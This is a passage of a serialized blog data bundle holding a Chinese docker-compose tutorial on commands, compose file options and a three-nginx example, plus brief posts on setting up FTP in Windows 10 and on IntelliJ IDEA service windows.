打印数据卷名，一行一个\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 18. docker-compose create\n\ndocker-compose create [options] [SERVICE...]\n为服务创建容器。\n选项包括：\n–force-recreate：重新创建容器，即使配置和镜像没有改变，不兼容–no-recreate参数\n–no-recreate：如果容器已经存在，不需要重新创建，不兼容–force-recreate参数\n–no-build：不创建镜像，即使缺失\n–build：创建容器前　　，生成镜像\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 19. docker-compose exec\n\ndocker-compose exec [options] SERVICE COMMAND [ARGS...]\n选项包括：\n-d 分离模式，后台运行命令。\n–privileged 获取特权。\n–user USER 指定运行的用户。\n-T 禁用分配TTY，默认docker-compose exec分配TTY。\n–index=index，当一个服务拥有多个容器时，可通过该参数登陆到该服务下的任何服务，例如：docker-compose exec –index=1 web /bin/bash ，web服务中包含多个容器\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 20. docker-compose port\n\ndocker-compose port [options] SERVICE PRIVATE_PORT\n显示某个容器端口所映射的公共端口。\n选项包括：\n–protocol=proto，指定端口协议，TCP（默认值）或者UDP\n–index=index，如果同意服务存在多个容器，指定命令对象容器的序号（默认为1）\n\n\n1\n2\n3\n4\n5\n\n\n\n# 21. docker-compose push\n\ndocker-compose push [options] [SERVICE...]\n推送服务依的镜像。\n选项包括：\n–ignore-push-failures 忽略推送镜像过程中的错误\n\n\n1\n2\n3\n4\n\n\n\n# 22. docker-compose stop\n\ndocker-compose stop [options] [SERVICE...]\n停止运行的容器\n\n\n1\n2\n\n\n\n# 23. docker-compose uppause\n\ndocker-compose unpause [SERVICE...]\n恢复处于暂停状态中的服务。\n\n\n1\n2\n\n\n\n# 三. Docker-compose 模板文件\n\n\n# 1. Docker-compose 模板文件简介\n\nCompose 允许用户通过一个 docker-compose.yml 模板文件（YAML 格式）来定义一组相关联的应用容器为一个项目（project）。 Compose 模板文件是一个定义服务、网络和卷的 YAML 文件。Compose 模板文件默认路径是当前目录下的 docker-compose.yml，可以使用. yml 或. yaml 作为文件扩展名。\nDocker-Compose 标准模板文件应该包含 version、services、networks 三大部分，最关键的是 services 和 networks 两个部分。\n举例\n\nversion: \'3\'\nservices:\n  web:\n    image: dockercloud/hello-world\n    ports:\n      - 8080\n    networks:\n      - front-tier\n      - back-tier\n\n  redis:\n    image: redis\n    links:\n      - web\n    networks:\n      - back-tier\n\n  lb:\n    image: dockercloud/haproxy\n    ports:\n      - 80:80\n    links:\n      - web\n    networks:\n      - front-tier\n      - back-tier\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock \n\nnetworks:\n  front-tier:\n    driver: bridge\n  back-tier:\n    driver: bridge\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\nCompose 目前有三个版本分别为 Version 1，Version 2，Version 3，Compose 区分 Version 1 和 Version 2（Compose 1.6.0+，Docker Engine 1.10.0+）。Version 2 支持更多的指令。Version 1 将来会被弃用。\n\n\n# 2. image\n\nimage 是指定服务的镜像名称或镜像 ID。如果镜像在本地不存在，Compose 将会尝试拉取镜像。\n\nservices: \n    web: \n        image: hello-world\n\n\n1\n2\n3\n\n\n\n# 3. build\n\n服务除了可以基于指定的镜像，还可以基于一份 Dockerfile，在使用 up 启动时执行构建任务，构建标签是 build，可以指定 Dockerfile 所在文件夹的路径。Compose 将会利用 Dockerfile 自动构建镜像，然后使用镜像启动服务容器。\n\nbuild: /path/to/build/dir\n\n\n1\n\n\n也可以是相对路径，只要上下文确定就可以读取到 Dockerfile。\n\nbuild: ./dir\n\n\n1\n\n\n设定上下文根目录，然后以该目录为准指定 Dockerfile。\n\nbuild:\n  context: ../../\n  dockerfile: path/of/Dockerfile\n\n\n1\n2\n3\n\n\nbuild 都是一个目录，如果要指定 Dockerfile 文件需要在 build 标签的子级标签中使用 dockerfile 标签指定。 如果同时指定 image 和 build 两个标签，那么 Compose 会构建镜像并且把镜像命名为 image 值指定的名字。\n\n\n# 4. context\n\ncontext 选项可以是 Dockerfile 的文件路径，也可以是到链接到 git 仓库的 url，当提供的值是相对路径时，被解析为相对于撰写文件的路径，此目录也是发送到 Docker 守护进程的 context\n\nbuild:\n  context: ./dir\n\n\n1\n2\n\n\n\n# 5. dockerfile\n\n使用 dockerfile 文件来构建，必须指定构建路径\n\nbuild:\n  context: .\n  dockerfile: Dockerfile-alternate\n\n\n1\n2\n3\n\n\n\n# 6. commond\n\ncommand: bundle exec thin -p 3000\n\n\n1\n\n\n\n# 7. container_name\n\nCompose 的容器名称格式是：<项目名称>< 服务名称 >< 序号 >\n可以自定义项目名称、服务名称，但如果想完全控制容器的命名，可以使用标签指定：\n\ncontainer_name: app\n\n\n1\n\n\n\n# 8. depends_on\n\n在使用 Compose 时，最大的好处就是少打启动命令，但一般项目容器启动的顺序是有要求的，如果直接从上到下启动容器，必然会因为容器依赖问题而启动失败。例如在没启动数据库容器的时候启动应用容器，应用容器会因为找不到数据库而退出。depends_on 标签用于解决容器的依赖、启动先后的问题\n\nversion: \'2\'\nservices:\n  web:\n    build: .\n    depends_on:\n      - db\n      - redis\n  redis:\n    image: redis\n  db:\n    image: postgres\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n上述 YAML 文件定义的容器会先启动 redis 和 db 两个服务，最后才启动 web 服务。\n\n\n# 9. PID\n\npid: "host"\n\n\n1\n\n\n将 PID 模式设置为主机 PID 模式，跟主机系统共享进程命名空间。容器使用 pid 标签将能够访问和操纵其他容器和宿主机的名称空间。\n\n\n# 10. ports\n\nports 用于映射端口的标签。　\n使用 HOST:CONTAINER 格式或者只是指定容器的端口，宿主机会随机映射端口。\n\nports:\n - "3000"\n - "8000:8000"\n - "49100:22"\n - "127.0.0.1:8001:8001"\n\n\n1\n2\n3\n4\n5\n\n\n当使用 HOST:CONTAINER 格式来映射端口时，如果使用的容器端口小于 60 可能会得到错误得结果，因为 YAML 将会解析 xx:yy 这种数字格式为 60 进制。所以建议采用字符串格式。\n\n\n# 11. extra_hosts\n\n添加主机名的标签，会在 / etc/hosts 文件中添加一些记录。\n\nextra_hosts:\n - "somehost:162.242.195.82"\n - "otherhost:50.31.209.229"\n\n\n1\n2\n3\n\n\n启动后查看容器内部 hosts：\n\n162.242.195.82  somehost\n50.31.209.229   otherhost\n\n\n1\n2\n\n\n\n# 12. volumes\n\n挂载一个目录或者一个已存在的数据卷容器，可以直接使用 [HOST:CONTAINER]格式，或者使用 [HOST:CONTAINER:ro] 格式，后者对于容器来说，数据卷是只读的，可以有效保护宿主机的文件系统。 Compose 的数据卷指定路径可以是相对路径，使用 . 或者 .. 来指定相对目录。 数据卷的格式可以是下面多种形式\n\nvolumes:\n  // 只是指定一个路径，Docker 会自动在创建一个数据卷（这个路径是容器内部的）。\n  - /var/lib/mysql\n  // 使用绝对路径挂载数据卷\n  - /opt/data:/var/lib/mysql\n  // 以 Compose 配置文件为中心的相对路径作为数据卷挂载到容器。\n  - ./cache:/tmp/cache\n  // 使用用户的相对路径（~/ 表示的目录是 /home/<用户目录>/ 或者 /root/）。\n  - ~/configs:/etc/configs/:ro\n  // 已经存在的命名的数据卷。\n  - datavolume:/var/lib/mysql\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n如果不使用宿主机的路径，可以指定一个 volume_driver。\n\n\n# 13. volumes_from\n\n从另一个服务或容器挂载其数据卷：\n\nvolumes_from:\n   - service_name    \n     - container_name\n\n\n1\n2\n3\n\n\n\n# 14. dns\n\n自定义 DNS 服务器。可以是一个值，也可以是一个列表。\n\ndns：8.8.8.8\ndns：\n    - 8.8.8.8    \n      - 9.9.9.9\n\n\n1\n2\n3\n4\n\n\n\n# 15. expose\n\n暴露端口，但不映射到宿主机，只允许能被连接的服务访问。仅可以指定内部端口为参数，如下所示：\n\nexpose:\n    - "3000"\n    - "8000"\n\n\n1\n2\n3\n\n\n\n# 16.links\n\n链接到其它服务中的容器。使用服务名称（同时作为别名），或者服务名称: 服务别名（如 SERVICE:ALIAS），例如\n\nlinks:\n    - db\n    - db:database\n    - redis\n\n\n1\n2\n3\n4\n\n\n\n# 17.net\n\n设置网络模式。\n\nnet: "bridge"\nnet: "none"\nnet: "host"\n\n\n1\n2\n3\n\n\n\n# 四. Docker-compose 模板文件示例\n\n\n# 1. Docker-compose 模板文件编写\n\n----------------------------------------\n\ndocker-compose.yml\n\nversion: \'2\'\nservices:\n  web1:\n    image: nginx\n    ports: \n      - "6061:80"\n    container_name: "web1"\n    networks:\n      - dev\n  web2:\n    image: nginx\n    ports: \n      - "6062:80"\n    container_name: "web2"\n    networks:\n      - dev\n      - pro\n  web3:\n    image: nginx\n    ports: \n      - "6063:80"\n    container_name: "web3"\n    networks:\n      - pro\nnetworks:\n  dev:\n    driver: bridge\n  pro:\n    driver: bridge\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\ndocker-compose.yml 文件指定了 3 个 web 服务\n\n\n# 2. 启动应用\n\n创建一个 webapp 目录，将 docker-compose.yaml 文件拷贝到 webapp 目录下，使用 docker-compose 启动应用。\n\ndocker-compose up -d\n\n\n1\n\n\n\n# 3. 服务访问\n\n通过浏览器访问 web1，web2，web3\n\nhttp://127.0.0.1:6061\nhttp://127.0.0.1:6062\nhttp://127.0.0.1:6063\n\n\n1\n2\n3\n',normalizedContent:'> 本文由原文地址 www.cnblogs.com\n\n参考：https://blog.51cto.com/9291927/2310444\n\n\n# 一. docker-compose 简介\n\n\n# 1. docker-compose 简介\n\ndocker-compose 项目是 docker 官方的开源项目，负责实现对 docker 容器集群的快速编排。 docker-compose 将所管理的容器分为三层，分别是工程（project），服务（service）以及容器（container）。docker-compose 运行目录下的所有文件（docker-compose.yml，extends 文件或环境变量文件等）组成一个工程，若无特殊指定工程名即为当前目录名。一个工程当中可包含多个服务，每个服务中定义了容器运行的镜像，参数，依赖。一个服务当中可包括多个容器实例，docker-compose 并没有解决负载均衡的问题，因此需要借助其它工具实现服务发现及负载均衡。 docker-compose 的工程配置文件默认为 docker-compose.yml，可通过环境变量 compose_file 或 - f 参数自定义配置文件，其定义了多个有依赖关系的服务及每个服务运行的容器。 使用一个 dockerfile 模板文件，可以让用户很方便的定义一个单独的应用容器。在工作中，经常会碰到需要多个容器相互配合来完成某项任务的情况。例如要实现一个 web 项目，除了 web 服务容器本身，往往还需要再加上后端的数据库服务容器，甚至还包括负载均衡容器等。 compose 允许用户通过一个单独的 docker-compose.yml 模板文件（yaml 格式）来定义一组相关联的应用容器为一个项目（project）。 docker-compose 项目由 python 编写，调用 docker 服务提供的 api 来对容器进行管理。因此，只要所操作的平台支持 docker api，就可以在其上利用 compose 来进行编排管理。\n\n\n# 2. docker-compose 的安装\n\n安装环境查看\n也可以使用其他发行版本 linux 系统\n\n安装\napt-get install python-pip\napt-get -y install docker-compose\n红帽系 linux 使用以下命令安装\nyum -y install python-pip\nyum -y install docker-compose\n查看安装的版本\ndocker-compose -v\ndocker-compose version 1.21.0, build unknown\n\n\n# 3. docker-compose 卸载\n\napt-get remove docker-compose\n\n\n# 二. docker-compose 常用命令\n\n\n# 1. docker-compose 命令格式\n\ndocker-compose [-f <arg>...] [options] [command] [args...]\n命令选项如下\n\n-f --file file指定compose模板文件，默认为docker-compose.yml\n-p --project-name name 指定项目名称，默认使用当前所在目录为项目名\n--verbose  输出更多调试信息\n-v，-version 打印版本并退出\n--log-level level 定义日志等级(debug, info, warning, error, critical)\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2. docker-compose up\n\ndocker-compose up [options] [--scale service=num...] [service...]\n选项包括：\n-d 在后台运行服务容器\n-no-color 不是有颜色来区分不同的服务的控制输出\n-no-deps 不启动服务所链接的容器\n--force-recreate 强制重新创建容器，不能与-no-recreate同时使用\n–no-recreate 如果容器已经存在，则不重新创建，不能与–force-recreate同时使用\n–no-build 不自动构建缺失的服务镜像\n–build 在启动容器前构建服务镜像\n–abort-on-container-exit 停止所有容器，如果任何一个容器被停止，不能与-d同时使用\n-t, –timeout timeout 停止容器时候的超时（默认为10秒）\n–remove-orphans 删除服务中没有在compose文件中定义的容器\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 3. docker-compose ps\n\ndocker-compose  ps [options] [service...]\n列出项目中所有在运行的容器\n\n\n1\n2\n\n\n\n# 4. docker-compose stop\n\ndocker-compose stop [options] [service...]\n选项包括\n-t, –timeout timeout 停止容器时候的超时（默认为10秒）\ndocker-compose stop\n停止正在运行的容器，可以通过docker-compose start 再次启动\n\n\n1\n2\n3\n4\n5\n\n\n\n# 5. docker-compose -h\n\ndocker-compose -h\n查看帮助\n\n\n1\n2\n\n\n\n# 6. docker-compose down\n\ndocker-compose down [options]\n停止和删除容器、网络、卷、镜像。\n选项包括：\n–rmi type，删除镜像，类型必须是：all，删除compose文件中定义的所有镜像；local，删除镜像名为空的镜像\n-v, –volumes，删除已经在compose文件中定义的和匿名的附在容器上的数据卷\n–remove-orphans，删除服务中没有在compose中定义的容器\ndocker-compose down\n停用移除所有容器以及网络相关\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 7. docker-compose logs\n\ndocker-compose logs [options] [service...]\n查看服务容器的输出。默认情况下，docker-compose将对不同的服务输出使用不同的颜色来区分。可以通过–no-color来关闭颜色。\ndocker-compose logs\n查看服务容器的输出 \n-f 跟踪日志输出\n\n\n1\n2\n3\n4\n5\n\n\n\n# 8. docker-compose bulid\n\ndocker-compose build [options] [--build-arg key=val...] [service...]\n构建（重新构建）项目中的服务容器。\n选项包括：\n–compress 通过gzip压缩构建上下环境\n–force-rm 删除构建过程中的临时容器\n–no-cache 构建镜像过程中不使用缓存\n–pull 始终尝试通过拉取操作来获取更新版本的镜像\n-m, –memory mem为构建的容器设置内存大小\n–build-arg key=val为服务设置build-time变量\n服务容器一旦构建后，将会带上一个标记名。可以随时在项目目录下运行docker-compose build来重新构建服务\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 9. docker-compose pull\n\ndocker-compose pull [options] [service...]\n拉取服务依赖的镜像。\n选项包括：\n–ignore-pull-failures，忽略拉取镜像过程中的错误\n–parallel，多个镜像同时拉取\n–quiet，拉取镜像过程中不打印进度信息\ndocker-compose pull\n拉取服务依赖的镜像\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 10. docker-compose restart\n\ndocker-compose restart [options] [service...]\n重启项目中的服务。\n选项包括：\n-t, –timeout timeout，指定重启前停止容器的超时（默认为10秒）\ndocker-compose restart\n重启项目中的服务 \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 11. docker-compose rm\n\ndocker-compose rm [options] [service...]\n删除所有（停止状态的）服务容器。\n选项包括：\n–f, –force，强制直接删除，包括非停止状态的容器\n-v，删除容器所挂载的数据卷\ndocker-compose rm\n删除所有（停止状态的）服务容器。推荐先执行docker-compose stop命令来停止容器。\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 12. docker-compose start\n\ndocker-compose start [service...]\ndocker-compose start\n启动已经存在的服务容器。\n\n\n1\n2\n3\n\n\n\n# 13. docker-compose run\n\ndocker-compose scale web=3 db=2\n设置指定服务运行的容器个数。通过service=num的参数来设置数量\n\n\n1\n2\n\n\n\n# 14. docker-compose scale\n\ndocker-compose scale web=3 db=2\n设置指定服务运行的容器个数。通过service=num的参数来设置数量\n\n\n1\n2\n\n\n\n# 15. docker-compose pause\n\ndocker-compose pause [service...]\n暂停一个服务容器\n\n\n1\n2\n\n\n\n# 16. docker-compose kill\n\ndocker-compose kill [options] [service...]\n通过发送sigkill信号来强制停止服务容器。 \n支持通过-s参数来指定发送的信号，例如通过如下指令发送sigint信号：\ndocker-compose kill -s sigint\n\n\n1\n2\n3\n4\n\n\n\n# 17. docker-compose config\n\ndocker-compose config [options]\n验证并查看compose文件配置。\n选项包括：\n–resolve-image-digests 将镜像标签标记为摘要\n-q, –quiet 只验证配置，不输出。 当配置正确时，不输出任何内容，当文件配置错误，输出错误信息\n–services 打印服务名，一行一个\n–volumes 打印数据卷名，一行一个\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 18. docker-compose create\n\ndocker-compose create [options] [service...]\n为服务创建容器。\n选项包括：\n–force-recreate：重新创建容器，即使配置和镜像没有改变，不兼容–no-recreate参数\n–no-recreate：如果容器已经存在，不需要重新创建，不兼容–force-recreate参数\n–no-build：不创建镜像，即使缺失\n–build：创建容器前　　，生成镜像\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 19. docker-compose exec\n\ndocker-compose exec [options] service command [args...]\n选项包括：\n-d 分离模式，后台运行命令。\n–privileged 获取特权。\n–user user 指定运行的用户。\n-t 禁用分配tty，默认docker-compose exec分配tty。\n–index=index，当一个服务拥有多个容器时，可通过该参数登陆到该服务下的任何服务，例如：docker-compose exec –index=1 web /bin/bash ，web服务中包含多个容器\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 20. docker-compose port\n\ndocker-compose port [options] service private_port\n显示某个容器端口所映射的公共端口。\n选项包括：\n–protocol=proto，指定端口协议，tcp（默认值）或者udp\n–index=index，如果同意服务存在多个容器，指定命令对象容器的序号（默认为1）\n\n\n1\n2\n3\n4\n5\n\n\n\n# 21. docker-compose push\n\ndocker-compose push [options] [service...]\n推送服务依的镜像。\n选项包括：\n–ignore-push-failures 忽略推送镜像过程中的错误\n\n\n1\n2\n3\n4\n\n\n\n# 22. docker-compose stop\n\ndocker-compose stop [options] [service...]\n停止运行的容器\n\n\n1\n2\n\n\n\n# 23. docker-compose uppause\n\ndocker-compose unpause [service...]\n恢复处于暂停状态中的服务。\n\n\n1\n2\n\n\n\n# 三. docker-compose 模板文件\n\n\n# 1. docker-compose 模板文件简介\n\ncompose 允许用户通过一个 docker-compose.yml 模板文件（yaml 格式）来定义一组相关联的应用容器为一个项目（project）。 compose 模板文件是一个定义服务、网络和卷的 yaml 文件。compose 模板文件默认路径是当前目录下的 docker-compose.yml，可以使用. yml 或. yaml 作为文件扩展名。\ndocker-compose 标准模板文件应该包含 version、services、networks 三大部分，最关键的是 services 和 networks 两个部分。\n举例\n\nversion: \'3\'\nservices:\n  web:\n    image: dockercloud/hello-world\n    ports:\n      - 8080\n    networks:\n      - front-tier\n      - back-tier\n\n  redis:\n    image: redis\n    links:\n      - web\n    networks:\n      - back-tier\n\n  lb:\n    image: dockercloud/haproxy\n    ports:\n      - 80:80\n    links:\n      - web\n    networks:\n      - front-tier\n      - back-tier\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock \n\nnetworks:\n  front-tier:\n    driver: bridge\n  back-tier:\n    driver: bridge\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\ncompose 目前有三个版本分别为 version 1，version 2，version 3，compose 区分 version 1 和 version 2（compose 1.6.0+，docker engine 1.10.0+）。version 2 支持更多的指令。version 1 将来会被弃用。\n\n\n# 2. image\n\nimage 是指定服务的镜像名称或镜像 id。如果镜像在本地不存在，compose 将会尝试拉取镜像。\n\nservices: \n    web: \n        image: hello-world\n\n\n1\n2\n3\n\n\n\n# 3. build\n\n服务除了可以基于指定的镜像，还可以基于一份 dockerfile，在使用 up 启动时执行构建任务，构建标签是 build，可以指定 dockerfile 所在文件夹的路径。compose 将会利用 dockerfile 自动构建镜像，然后使用镜像启动服务容器。\n\nbuild: /path/to/build/dir\n\n\n1\n\n\n也可以是相对路径，只要上下文确定就可以读取到 dockerfile。\n\nbuild: ./dir\n\n\n1\n\n\n设定上下文根目录，然后以该目录为准指定 dockerfile。\n\nbuild:\n  context: ../../\n  dockerfile: path/of/dockerfile\n\n\n1\n2\n3\n\n\nbuild 都是一个目录，如果要指定 dockerfile 文件需要在 build 标签的子级标签中使用 dockerfile 标签指定。 如果同时指定 image 和 build 两个标签，那么 compose 会构建镜像并且把镜像命名为 image 值指定的名字。\n\n\n# 4. context\n\ncontext 选项可以是 dockerfile 的文件路径，也可以是到链接到 git 仓库的 url，当提供的值是相对路径时，被解析为相对于撰写文件的路径，此目录也是发送到 docker 守护进程的 context\n\nbuild:\n  context: ./dir\n\n\n1\n2\n\n\n\n# 5. dockerfile\n\n使用 dockerfile 文件来构建，必须指定构建路径\n\nbuild:\n  context: .\n  dockerfile: dockerfile-alternate\n\n\n1\n2\n3\n\n\n\n# 6. commond\n\ncommand: bundle exec thin -p 3000\n\n\n1\n\n\n\n# 7. container_name\n\ncompose 的容器名称格式是：<项目名称>< 服务名称 >< 序号 >\n可以自定义项目名称、服务名称，但如果想完全控制容器的命名，可以使用标签指定：\n\ncontainer_name: app\n\n\n1\n\n\n\n# 8. depends_on\n\n在使用 compose 时，最大的好处就是少打启动命令，但一般项目容器启动的顺序是有要求的，如果直接从上到下启动容器，必然会因为容器依赖问题而启动失败。例如在没启动数据库容器的时候启动应用容器，应用容器会因为找不到数据库而退出。depends_on 标签用于解决容器的依赖、启动先后的问题\n\nversion: \'2\'\nservices:\n  web:\n    build: .\n    depends_on:\n      - db\n      - redis\n  redis:\n    image: redis\n  db:\n    image: postgres\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n上述 yaml 文件定义的容器会先启动 redis 和 db 两个服务，最后才启动 web 服务。\n\n\n# 9. pid\n\npid: "host"\n\n\n1\n\n\n将 pid 模式设置为主机 pid 模式，跟主机系统共享进程命名空间。容器使用 pid 标签将能够访问和操纵其他容器和宿主机的名称空间。\n\n\n# 10. ports\n\nports 用于映射端口的标签。　\n使用 host:container 格式或者只是指定容器的端口，宿主机会随机映射端口。\n\nports:\n - "3000"\n - "8000:8000"\n - "49100:22"\n - "127.0.0.1:8001:8001"\n\n\n1\n2\n3\n4\n5\n\n\n当使用 host:container 格式来映射端口时，如果使用的容器端口小于 60 可能会得到错误得结果，因为 yaml 将会解析 xx:yy 这种数字格式为 60 进制。所以建议采用字符串格式。\n\n\n# 11. extra_hosts\n\n添加主机名的标签，会在 / etc/hosts 文件中添加一些记录。\n\nextra_hosts:\n - "somehost:162.242.195.82"\n - "otherhost:50.31.209.229"\n\n\n1\n2\n3\n\n\n启动后查看容器内部 hosts：\n\n162.242.195.82  somehost\n50.31.209.229   otherhost\n\n\n1\n2\n\n\n\n# 12. volumes\n\n挂载一个目录或者一个已存在的数据卷容器，可以直接使用 [host:container]格式，或者使用 [host:container:ro] 格式，后者对于容器来说，数据卷是只读的，可以有效保护宿主机的文件系统。 compose 的数据卷指定路径可以是相对路径，使用 . 或者 .. 来指定相对目录。 数据卷的格式可以是下面多种形式\n\nvolumes:\n  // 只是指定一个路径，docker 会自动在创建一个数据卷（这个路径是容器内部的）。\n  - /var/lib/mysql\n  // 使用绝对路径挂载数据卷\n  - /opt/data:/var/lib/mysql\n  // 以 compose 配置文件为中心的相对路径作为数据卷挂载到容器。\n  - ./cache:/tmp/cache\n  // 使用用户的相对路径（~/ 表示的目录是 /home/<用户目录>/ 或者 /root/）。\n  - ~/configs:/etc/configs/:ro\n  // 已经存在的命名的数据卷。\n  - datavolume:/var/lib/mysql\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n如果不使用宿主机的路径，可以指定一个 volume_driver。\n\n\n# 13. volumes_from\n\n从另一个服务或容器挂载其数据卷：\n\nvolumes_from:\n   - service_name    \n     - container_name\n\n\n1\n2\n3\n\n\n\n# 14. dns\n\n自定义 dns 服务器。可以是一个值，也可以是一个列表。\n\ndns：8.8.8.8\ndns：\n    - 8.8.8.8    \n      - 9.9.9.9\n\n\n1\n2\n3\n4\n\n\n\n# 15. expose\n\n暴露端口，但不映射到宿主机，只允许能被连接的服务访问。仅可以指定内部端口为参数，如下所示：\n\nexpose:\n    - "3000"\n    - "8000"\n\n\n1\n2\n3\n\n\n\n# 16.links\n\n链接到其它服务中的容器。使用服务名称（同时作为别名），或者服务名称: 服务别名（如 service:alias），例如\n\nlinks:\n    - db\n    - db:database\n    - redis\n\n\n1\n2\n3\n4\n\n\n\n# 17.net\n\n设置网络模式。\n\nnet: "bridge"\nnet: "none"\nnet: "host"\n\n\n1\n2\n3\n\n\n\n# 四. docker-compose 模板文件示例\n\n\n# 1. docker-compose 模板文件编写\n\n----------------------------------------\n\ndocker-compose.yml\n\nversion: \'2\'\nservices:\n  web1:\n    image: nginx\n    ports: \n      - "6061:80"\n    container_name: "web1"\n    networks:\n      - dev\n  web2:\n    image: nginx\n    ports: \n      - "6062:80"\n    container_name: "web2"\n    networks:\n      - dev\n      - pro\n  web3:\n    image: nginx\n    ports: \n      - "6063:80"\n    container_name: "web3"\n    networks:\n      - pro\nnetworks:\n  dev:\n    driver: bridge\n  pro:\n    driver: bridge\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\ndocker-compose.yml 文件指定了 3 个 web 服务\n\n\n# 2. 启动应用\n\n创建一个 webapp 目录，将 docker-compose.yaml 文件拷贝到 webapp 目录下，使用 docker-compose 启动应用。\n\ndocker-compose up -d\n\n\n1\n\n\n\n# 3. 服务访问\n\n通过浏览器访问 web1，web2，web3\n\nhttp://127.0.0.1:6061\nhttp://127.0.0.1:6062\nhttp://127.0.0.1:6063\n\n\n1\n2\n3\n',charsets:{cjk:!0},lastUpdated:"2022/05/31, 14:56:19",lastUpdatedTimestamp:1653980179e3},{title:"Win10开启FTP与配置",frontmatter:{title:"Win10开启FTP与配置",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/2f837f/",categories:["软件使用","FTP"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/02.FTP/01.Win10%E5%BC%80%E5%90%AFFTP%E4%B8%8E%E9%85%8D%E7%BD%AE.html",relativePath:"08.软件使用/02.FTP/01.Win10开启FTP与配置.md",key:"v-94935014",path:"/pages/2f837f/",headersStr:null,content:"# 1.控制面板>程序>启用或关闭Windows功能>…\n\n(控制面板可在 桌面右键>个性化>主题>桌面图标设置>勾选控制面板>确定)\n\n\n# 2.小娜搜索IIS打开IIS\n\n\n\n\n# 3.右击网站添加FTP站点\n\n\n\n\n# 4.输入站点名称和作为FTP的目录\n\n\n\n\n# 5.IP地址填FTP本机IP，选择无SSL\n\n\n\n\n# 6.根据需要选择身份验证，授权与权限\n\n\n\n\n# 7.控制面板>系统和安全>防火墙>允许应用或功能通过Window防火墙>…\n\n\n\n\n# 8.点击更改设置，勾选FTP服务器&专用&公用\n\n\n\n\n# 9.点击允许其它应用,选择C:\\Windows\\System32\\svchost.exe然后添加，最后确定。\n\n\n\n\n# 10.资源处理器访问ftp:// IP 试试吧！",normalizedContent:"# 1.控制面板>程序>启用或关闭windows功能>…\n\n(控制面板可在 桌面右键>个性化>主题>桌面图标设置>勾选控制面板>确定)\n\n\n# 2.小娜搜索iis打开iis\n\n\n\n\n# 3.右击网站添加ftp站点\n\n\n\n\n# 4.输入站点名称和作为ftp的目录\n\n\n\n\n# 5.ip地址填ftp本机ip，选择无ssl\n\n\n\n\n# 6.根据需要选择身份验证，授权与权限\n\n\n\n\n# 7.控制面板>系统和安全>防火墙>允许应用或功能通过window防火墙>…\n\n\n\n\n# 8.点击更改设置，勾选ftp服务器&专用&公用\n\n\n\n\n# 9.点击允许其它应用,选择c:\\windows\\system32\\svchost.exe然后添加，最后确定。\n\n\n\n\n# 10.资源处理器访问ftp:// ip 试试吧！",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"IDEA不显示service 服务窗口",frontmatter:{title:"IDEA不显示service 服务窗口",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/c43bb9/",categories:["软件使用","intellij idea"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/03.intellij%20idea/01.IDEA%E4%B8%8D%E6%98%BE%E7%A4%BAservice%20%E6%9C%8D%E5%8A%A1%E7%AA%97%E5%8F%A3.html",relativePath:"08.软件使用/03.intellij idea/01.IDEA不显示service 服务窗口.md",key:"v-1eff6e19",path:"/pages/c43bb9/",headersStr:null,content:"IDEA不显示service 服务窗口解决办法：\n\n 1. 工具栏    View--\x3e Tool Windows --\x3e  Services\n\n\n\n 2. Service窗口   Add services --\x3e  Run Configuration Type  --\x3e  SpringBoot\n\n\n\n",normalizedContent:"idea不显示service 服务窗口解决办法：\n\n 1. 工具栏    view--\x3e tool windows --\x3e  services\n\n\n\n 2. service窗口   add services --\x3e  run configuration type  --\x3e  springboot\n\n\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"IDEA查看接口或类的继承实现关系图",frontmatter:{title:"IDEA查看接口或类的继承实现关系图",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/258ff7/",categories:["软件使用","intellij 